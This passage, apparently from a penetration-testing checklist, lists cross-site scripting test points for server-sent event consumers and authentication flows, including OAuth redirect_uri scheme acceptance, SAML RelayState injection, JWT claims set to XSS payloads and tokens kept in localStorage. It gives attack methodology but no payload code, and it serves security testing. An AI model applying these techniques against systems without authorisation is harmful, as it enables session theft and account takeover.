- Check if EventSource consumers use `innerHTML` or `textContent` to render data

#### Authentication Flow XSS Testing
- Test OAuth redirect_uri for `javascript:` and `data:` scheme acceptance
- Test OAuth state parameter reflection on callback pages
- Test SAML RelayState parameter for HTML injection
- Test JWT claim rendering: set `name` or `email` claims to XSS payloads and check rendering
- Check if API tokens/JWTs are stored in localStorage (accessible to XSS)

**Source:** Based on WAFFLED methodology (arXiv 2503.10846), Bruno Mendes HPP research (Ethiack, August 2025), and 2026 SSE injection CVEs
